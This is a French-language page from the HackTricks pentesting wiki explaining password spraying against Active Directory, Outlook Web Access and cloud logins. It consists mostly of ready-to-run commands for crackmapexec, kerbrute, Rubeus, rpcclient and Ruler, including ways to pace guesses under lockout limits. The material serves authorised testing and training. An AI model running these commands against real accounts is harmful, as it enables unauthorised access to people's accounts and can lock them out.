## **Password Spraying (Attaque par mot de passe)**

Une fois que vous avez trouvé plusieurs **noms d'utilisateur valides**, vous pouvez essayer les **mots de passe les plus courants** (gardez à l'esprit la politique de mot de passe de l'environnement) avec chacun des utilisateurs découverts.\
Par **défaut**, la **longueur minimale** du **mot de passe** est de **7**.

Les listes de noms d'utilisateur courants pourraient également être utiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Notez que vous **pourriez verrouiller certains comptes si vous essayez plusieurs mots de passe incorrects** (par défaut plus de 10).

### Obtenir la politique de mot de passe

Si vous avez des informations d'identification utilisateur ou un shell en tant qu'utilisateur de domaine, vous pouvez **obtenir la politique de mot de passe avec**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10; 
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation depuis Linux (ou autre)

* Utilisation de **crackmapexec :**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
* Utilisation de [**kerbrute**](https://github.com/ropnop/kerbrute) **** (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
* [_**spray**_](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
* Utilisation de [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NON RECOMMANDÉ PARFOIS NE FONCTIONNE PAS
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
* Avec le module `scanner/smb/smb_login` de **Metasploit** :

![](<../../.gitbook/assets/image (132) (1).png>)

* En utilisant **rpcclient** :
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Depuis Windows

* Avec la version de [Rubeus](https://github.com/Zer1t0/Rubeus) qui inclut le module brute :
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
* Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer des utilisateurs à partir du domaine par défaut et il obtiendra la politique de mot de passe du domaine et limitera les tentatives en fonction de celle-ci):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
* Avec [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)****
```
Invoke-SprayEmptyPassword
```
## Outlook Web Access

Il existe plusieurs outils pour effectuer une attaque de type p**assword spraying sur Outlook**.

* Avec [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
* Avec [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
* Avec [Ruler](https://github.com/sensepost/ruler) (fiable !)
* Avec [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
* Avec [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Pour utiliser l'un de ces outils, vous avez besoin d'une liste d'utilisateurs et d'un mot de passe / d'une petite liste de mots de passe à tester.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
    [x] Failed: larsson:Summer2020
    [x] Failed: cube0x0:Summer2020
    [x] Failed: a.admin:Summer2020
    [x] Failed: c.cube:Summer2020
    [+] Success: s.svensson:Summer2020
```
## Google

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

* [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
* [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
* [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Références

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
* www.blackhillsinfosec.com/?p=5296
* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
